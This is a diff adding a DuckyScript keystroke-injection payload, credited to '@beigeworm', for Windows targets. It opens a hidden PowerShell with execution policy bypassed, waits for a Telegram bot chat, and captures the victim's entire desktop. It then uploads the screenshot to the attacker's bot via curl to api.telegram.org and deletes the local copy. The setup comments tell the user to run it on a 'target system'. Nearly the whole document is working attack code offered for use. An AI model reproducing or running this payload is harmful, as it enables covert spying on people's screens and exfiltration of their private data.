@@ -1,0 +1,26 @@
+REM Title: beigeworm's Desktop Screenshot to Telegram.
+REM Author: @beigeworm
+REM Description: Using a Telegram Bot's Chat to receive a screenshot of the desktop.
+REM Target: Windows 10 and 11
+
+REM SETUP INSTRUCTIONS
+REM 1. Install Telegram and make an account if you haven't already.
+REM 2. Visit https://t.me/botfather and make a bot. (make a note of the API token)
+REM 3. Click the provided link to open the chat E.G. "t.me/****bot" then type or click /start)
+REM 4. Run the script on target system
+REM 5. Check telegram chat for 'waiting to connect' message.
+REM 6. This script has a feature to wait until you start the session from Telegram.
+REM 7. Type the computer name from the 'waiting' message into Telegram bot chat to connect to that computer.
+REM 8. Replace TELEGRAM_BOT_API_TOKEN_HERE Below with your Telegram Bot API Token
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+ENTER
+DELAY 4000
+STRING $Token = "TELEGRAM_TOKEN_HERE";$URL='https://api.telegram.org/bot{0}' -f $Token;while($chatID.length -eq 0){$updates = Invoke-RestMethod -Uri ($url + "/getUpdates");if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1];if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}};Sleep 10}Add-Type -AssemblyName System.Windows.Forms;$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height;$graphics = [System.Drawing.Graphics]::FromImage($bitmap);$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size);$filePath = "$env:temp\sc.png";$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png);$graphics.Dispose();$bitmap.Dispose();curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "https://api.telegram.org/bot$Token/sendDocument";rm -Path $filePath;exit
+DELAY 500
+ENTER
